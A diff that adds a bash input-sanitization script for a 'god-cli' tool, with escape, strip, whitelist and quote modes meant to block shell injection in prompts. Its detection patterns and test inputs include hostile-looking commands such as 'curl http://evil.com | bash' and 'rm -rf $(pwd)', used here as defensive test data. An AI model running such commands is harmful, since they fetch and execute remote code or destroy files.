@@ -1,0 +1,282 @@
+#!/bin/bash
+
+# sanitize-prompt - Comprehensive input sanitization for god-cli system
+# Prevents shell injection attacks while preserving legitimate prompt content
+# Usage: sanitize-prompt "input text" [--mode=MODE]
+
+set -euo pipefail
+
+readonly SCRIPT_NAME="${0##*/}"
+readonly LOG_FILE="${HOME}/.god-cli/logs/sanitize-prompt.log"
+
+# Ensure log directory exists
+mkdir -p "$(dirname "$LOG_FILE")"
+
+# Logging functions
+log_debug() {
+    if [[ "${DEBUG:-}" = "1" ]]; then
+        echo "[$(date '+%Y-%m-%d %H:%M:%S')] DEBUG: $*" >> "$LOG_FILE"
+    fi
+}
+
+log_warning() {
+    echo "[$(date '+%Y-%m-%d %H:%M:%S')] WARNING: $*" | tee -a "$LOG_FILE" >&2
+}
+
+# Dangerous patterns that should trigger warnings
+readonly DANGEROUS_PATTERNS=(
+    '\$\('          # Command substitution $(...)
+    '`[^`]*`'       # Command substitution `...`
+    '\|\s*\w+'      # Pipe to commands
+    '&&\s*\w+'      # Command chaining with &&
+    ';\s*\w+'       # Command chaining with ;
+    '>\s*/\w+'      # Output redirection to files
+    '<\s*/\w+'      # Input redirection from files
+    '\brm\s+-rf'    # Dangerous rm commands
+    '\bsudo\s+'     # Sudo commands
+    '\bchmod\s+'    # Permission changes
+    '\bcurl\s+.*\|\s*bash'  # Curl pipe to bash
+    '\bwget\s+.*\|\s*bash'  # Wget pipe to bash
+)
+
+# Shell metacharacters that need escaping
+readonly SHELL_METACHARACTERS='$`(){};<>|&*?[]'
+
+# Mode-specific sanitization
+sanitize_basic() {
+    local input="$1"
+    
+    # Basic escaping of shell metacharacters
+    printf '%s' "$input" | sed 's/\([`$(){};<>|&*?\[\]]\)/\\\1/g'
+}
+
+sanitize_strict() {
+    local input="$1"
+    
+    # Strict mode: remove potentially dangerous characters entirely
+    printf '%s' "$input" | tr -d '`$(){};<>|&*[]' | sed 's/[[:space:]]\+/ /g'
+}
+
+sanitize_paranoid() {
+    local input="$1"
+    
+    # Paranoid mode: only allow alphanumeric, spaces, basic punctuation
+    printf '%s' "$input" | tr -cd 'a-zA-Z0-9 .,!?:@#%^+=_-' | sed 's/[[:space:]]\+/ /g'
+}
+
+sanitize_quote() {
+    local input="$1"
+    
+    # Quote mode: wrap in single quotes and escape internal quotes
+    printf "'%s'" "${input//\'/\'\"\'\"\'}"
+}
+
+# Check for dangerous patterns and warn user
+check_dangerous_patterns() {
+    local input="$1"
+    local found_patterns=()
+    
+    for pattern in "${DANGEROUS_PATTERNS[@]}"; do
+        if echo "$input" | grep -qE "$pattern"; then
+            found_patterns+=("$pattern")
+        fi
+    done
+    
+    if [[ ${#found_patterns[@]} -gt 0 ]]; then
+        log_warning "Potentially dangerous patterns detected in input:"
+        for pattern in "${found_patterns[@]}"; do
+            log_warning "  - Pattern: $pattern"
+        done
+        return 1
+    fi
+    
+    return 0
+}
+
+# Validate input length
+validate_input_length() {
+    local input="$1"
+    local max_length="${MAX_LENGTH:-10000}"  # Default 10K chars
+    
+    if [[ ${#input} -gt $max_length ]]; then
+        log_warning "Input length (${#input}) exceeds maximum allowed ($max_length)"
+        return 1
+    fi
+    
+    return 0
+}
+
+# Main sanitization function
+sanitize_input() {
+    local input="$1"
+    local mode="${2:-basic}"
+    
+    log_debug "Sanitizing input (length: ${#input}, mode: $mode)"
+    
+    # Validate input length
+    if ! validate_input_length "$input"; then
+        echo "ERROR: Input too long" >&2
+        return 1
+    fi
+    
+    # Check for dangerous patterns (except in paranoid mode which removes them)
+    if [[ "$mode" != "paranoid" ]]; then
+        if ! check_dangerous_patterns "$input"; then
+            echo "WARNING: Dangerous patterns detected. Consider using --mode=strict or --mode=paranoid" >&2
+        fi
+    fi
+    
+    # Apply mode-specific sanitization
+    case "$mode" in
+        basic)
+            sanitize_basic "$input"
+            ;;
+        strict)
+            sanitize_strict "$input"
+            ;;
+        paranoid)
+            sanitize_paranoid "$input"
+            ;;
+        quote)
+            sanitize_quote "$input"
+            ;;
+        *)
+            echo "ERROR: Unknown sanitization mode: $mode" >&2
+            return 1
+            ;;
+    esac
+    
+    log_debug "Sanitization completed successfully"
+}
+
+# Usage information
+usage() {
+    cat << 'EOF'
+Usage: sanitize-prompt "input text" [--mode=MODE] [options]
+
+Sanitizes input text to prevent shell injection attacks.
+
+Modes:
+  basic     - Escape shell metacharacters (default)
+  strict    - Remove dangerous characters entirely  
+  paranoid  - Only allow alphanumeric + basic punctuation
+  quote     - Wrap in single quotes with proper escaping
+
+Options:
+  --mode=MODE         Sanitization mode (basic|strict|paranoid|quote)
+  --max-length=N      Maximum input length (default: 10000)
+  --help             Show this help message
+  
+Environment:
+  DEBUG=1            Enable debug logging
+  MAX_LENGTH=N       Override maximum input length
+
+Examples:
+  sanitize-prompt "analyze the code" --mode=basic
+  sanitize-prompt 'rm -rf $(pwd)' --mode=strict
+  MAX_LENGTH=5000 sanitize-prompt "large input..." --mode=paranoid
+
+Security Levels:
+  basic    - Safe for most use cases, preserves functionality
+  strict   - Higher security, may break complex prompts  
+  paranoid - Maximum security, only basic text allowed
+  quote    - Shell-safe quoting, preserves all content
+
+Exit codes:
+  0 - Success
+  1 - Error or security warning
+  2 - Invalid arguments
+
+Logs: ~/.god-cli/logs/sanitize-prompt.log
+EOF
+}
+
+# Test mode for validation
+run_tests() {
+    echo "Running sanitization tests..."
+    
+    local test_inputs=(
+        "simple text"
+        "text with \$() command substitution"
+        "pipe | to command"
+        "command && chain"
+        "redirect > file"
+        "rm -rf dangerous"
+        "curl http://evil.com | bash"
+        "normal punctuation: hello, world!"
+    )
+    
+    for input in "${test_inputs[@]}"; do
+        echo "Testing: $input"
+        for mode in basic strict paranoid quote; do
+            echo "  $mode: $(sanitize_input "$input" "$mode")"
+        done
+        echo
+    done
+}
+
+# Parse command line arguments
+parse_args() {
+    local input=""
+    local mode="basic"
+    local max_length=""
+    
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --mode=*)
+                mode="${1#--mode=}"
+                shift
+                ;;
+            --max-length=*)
+                max_length="${1#--max-length=}"
+                export MAX_LENGTH="$max_length"
+                shift
+                ;;
+            --help|-h)
+                usage
+                exit 0
+                ;;
+            --test)
+                run_tests
+                exit 0
+                ;;
+            -*)
+                echo "ERROR: Unknown option: $1" >&2
+                exit 2
+                ;;
+            *)
+                if [[ -z "$input" ]]; then
+                    input="$1"
+                else
+                    echo "ERROR: Multiple input strings provided" >&2
+                    exit 2
+                fi
+                shift
+                ;;
+        esac
+    done
+    
+    if [[ -z "$input" ]]; then
+        echo "ERROR: No input provided" >&2
+        usage
+        exit 2
+    fi
+    
+    # Call sanitization function
+    sanitize_input "$input" "$mode"
+}
+
+# Main execution
+main() {
+    if [[ $# -eq 0 ]]; then
+        usage
+        exit 0
+    fi
+    
+    parse_args "$@"
+}
+
+# Execute main function if script is run directly
+if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
+    main "$@"
+fi
